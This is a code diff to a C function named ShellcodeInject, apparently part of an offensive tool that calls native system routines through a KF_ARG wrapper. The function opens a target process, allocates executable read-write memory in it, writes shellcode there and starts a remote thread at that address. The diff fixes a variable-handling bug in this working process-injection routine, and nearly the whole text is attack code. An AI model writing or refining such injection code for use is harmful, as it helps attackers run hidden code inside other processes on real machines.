@@ -250,8 +250,9 @@ BOOL ShellcodeInject(HANDLE ProcessId, PVOID Shellcode, SIZE_T ShellcodeSize)
 {
     BOOL bRet = FALSE;
     DWORD_PTR Status = 0;
-    HANDLE hProcess = NULL, hThread = NULL;    
-    PVOID ShellcodeAddr = NULL;
+    HANDLE hProcess = NULL, hThread = NULL;        
+    SIZE_T MemSize = ShellcodeSize;
+    PVOID MemAddr = NULL;
 
     CLIENT_ID ClientId;
     OBJECT_ATTRIBUTES ObjAttr;       
@@ -284,9 +285,9 @@ BOOL ShellcodeInject(HANDLE ProcessId, PVOID Shellcode, SIZE_T ShellcodeSize)
     }
 
     PVOID Args_2[] = { KF_ARG(hProcess),                    // ProcessHandle    
-                       KF_ARG(&ShellcodeAddr),              // BaseAddress
+                       KF_ARG(&MemAddr),                    // BaseAddress
                        KF_ARG(0),                           // ZeroBits
-                       KF_ARG(&ShellcodeSize),              // RegionSize
+                       KF_ARG(&MemSize),                    // RegionSize
                        KF_ARG(MEM_COMMIT | MEM_RESERVE),    // AllocationType
                        KF_ARG(PAGE_EXECUTE_READWRITE) };    // Protect
 
@@ -302,7 +303,7 @@ BOOL ShellcodeInject(HANDLE ProcessId, PVOID Shellcode, SIZE_T ShellcodeSize)
     }
 
     PVOID Args_3[] = { KF_ARG(hProcess),                    // ProcessHandle    
-                       KF_ARG(ShellcodeAddr),               // BaseAddress
+                       KF_ARG(MemAddr),                     // BaseAddress
                        KF_ARG(Shellcode),                   // Buffer
                        KF_ARG(ShellcodeSize),               // NumberOfBytesToWrite
                        KF_ARG(NULL) };                      // NumberOfBytesWritten
@@ -324,7 +325,7 @@ BOOL ShellcodeInject(HANDLE ProcessId, PVOID Shellcode, SIZE_T ShellcodeSize)
                        KF_ARG(0),                           // StackZeroBits
                        KF_ARG(NULL),                        // StackReserved
                        KF_ARG(NULL),                        // StackCommit
-                       KF_ARG(ShellcodeAddr),               // StartAddress 
+                       KF_ARG(MemAddr),                     // StartAddress 
                        KF_ARG(NULL),                        // StartParameter
                        KF_ARG(&hThread),                    // ThreadHandle
                        KF_ARG(&ClientId) };                 // ClientId
